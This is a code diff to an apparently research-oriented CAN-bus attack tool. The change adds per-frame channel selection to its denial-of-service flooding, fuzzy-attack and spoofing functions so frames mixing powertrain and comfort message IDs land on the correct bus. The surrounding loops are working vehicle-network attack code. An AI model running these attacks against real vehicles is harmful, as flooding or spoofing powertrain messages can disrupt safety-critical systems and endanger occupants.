@@ -70,6 +70,14 @@ def _keep_running(stop_event):
     return stop_event is None or not stop_event.is_set()
 
 
+def _frame_channel(send_channel, arbitration_id):
+    """send_channel may be a fixed channel/netid, None, or a callable(arbitration_id) that
+    picks the channel per frame. The in-window terminal passes a callable on the neovi
+    backend so a fuzzy attack (which mixes POWERTRAIN and COMFORT message IDs) lands each
+    frame on the right bus; the CLI passes None (its bus is already a single channel)."""
+    return send_channel(arbitration_id) if callable(send_channel) else send_channel
+
+
 def denial_of_service_func(bus, period: float, *, stop_event=None, send_channel=None,
                            send_timeout=None, on_status=_print_status):
     """Flood the CAN bus with high-priority empty frames at the given period."""
@@ -77,7 +85,8 @@ def denial_of_service_func(bus, period: float, *, stop_event=None, send_channel=
     t0 = time.monotonic()
     while _keep_running(stop_event):
         msg = can.Message(arbitration_id=0x000, data=[0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
-                          is_extended_id=False, channel=send_channel)
+                          is_extended_id=False)
+        msg.channel = _frame_channel(send_channel, msg.arbitration_id)
         bus.send(msg, timeout=send_timeout)
         sent += 1
         elapsed = time.monotonic() - t0 or 1e-9
@@ -96,7 +105,8 @@ def fuzzy_attack_func(bus, *, stop_event=None, send_channel=None,
         attack = random.choice(known_attacks)
         feature = FEATURE_CAN_ID_PAYLOAD_MAPPER[attack]
         msg = can.Message(arbitration_id=feature['id'], data=feature['payload'],
-                          is_extended_id=False, channel=send_channel)
+                          is_extended_id=False)
+        msg.channel = _frame_channel(send_channel, msg.arbitration_id)
         bus.send(msg, timeout=send_timeout)
         sent += 1
         elapsed = time.monotonic() - t0 or 1e-9
@@ -112,7 +122,8 @@ def spoofing_attacks_func(bus, feature: str, period: float, *, stop_event=None,
     t0 = time.monotonic()
     while _keep_running(stop_event):
         msg = can.Message(arbitration_id=selected_feature['id'], data=selected_feature['payload'],
-                          is_extended_id=False, channel=send_channel)
+                          is_extended_id=False)
+        msg.channel = _frame_channel(send_channel, msg.arbitration_id)
         bus.send(msg, timeout=send_timeout)
         sent += 1
         elapsed = time.monotonic() - t0 or 1e-9
